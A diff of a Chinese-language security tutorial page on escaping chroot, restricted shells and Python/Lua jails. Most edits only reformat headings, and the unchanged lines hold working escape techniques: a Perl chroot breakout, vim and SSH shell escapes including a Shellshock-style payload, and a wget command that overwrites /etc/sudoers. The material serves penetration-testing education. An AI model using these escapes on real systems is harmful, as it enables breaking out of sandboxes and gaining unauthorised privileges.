@@ -64,8 +64,6 @@ os.chroot(".")
 os.system("/bin/bash")
 ````
 
-
-
 \`\`\`perl #!/usr/bin/perl mkdir "chroot-dir"; chroot "chroot-dir"; foreach my $i (0..1000) { chdir ".." } chroot "."; system("/bin/bash"); \`\`\`
 
 </details>
@@ -157,7 +155,7 @@ export
 pwd
 ````
 
-#### 修改 PATH
+**修改 PATH**
 
 检查是否可以修改 PATH 环境变量
 
@@ -167,14 +165,14 @@ PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change
 echo /home/* #List directory
 ```
 
-#### 使用 vim
+**使用 vim**
 
 ```bash
 :set shell=/bin/sh
 :shell
 ```
 
-#### 创建脚本
+**创建脚本**
 
 检查是否可以创建一个内容为 _/bin/bash_ 的可执行文件
 
@@ -183,7 +181,7 @@ red /bin/bash
 > w wx/path #Write /bin/bash in a writable and executable path
 ```
 
-#### 通过 SSH 获取 bash
+**通过 SSH 获取 bash**
 
 如果您通过 ssh 访问，可以使用这个技巧来执行一个 bash shell：
 
@@ -193,7 +191,7 @@ ssh user@<IP> -t "bash --noprofile -i"
 ssh user@<IP> -t "() { :; }; sh -i "
 ```
 
-#### 声明
+**声明**
 
 ```bash
 declare -n PATH; export PATH=/bin;bash -i
@@ -201,7 +199,7 @@ declare -n PATH; export PATH=/bin;bash -i
 BASH_CMDS[shell]=/bin/bash;shell -i
 ```
 
-#### Wget
+**Wget**
 
 你可以覆盖例如sudoers文件
 
@@ -209,7 +207,7 @@ BASH_CMDS[shell]=/bin/bash;shell -i
 wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
 ```
 
-#### 其他技巧
+**其他技巧**
 
 以下页面包含了关于逃离受限Linux shell的技巧：
 
@@ -218,11 +216,11 @@ wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
 [https://gtfobins.github.io](https://gtfobins.github.io)\
 **以下页面也可能有趣：**
 
-### Python 监狱
+#### Python 监狱
 
 关于逃离Python监狱的技巧，请参阅以下页面：
 
-### Lua 监狱
+#### Lua 监狱
 
 在此页面中，你可以找到在Lua中可以访问的全局函数：[https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)
 
@@ -264,10 +262,8 @@ for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(
 debug.debug()
 ```
 
-### 参考资料
+#### 参考资料
 
 * [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (幻灯片: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))
-
-
 
 </details>
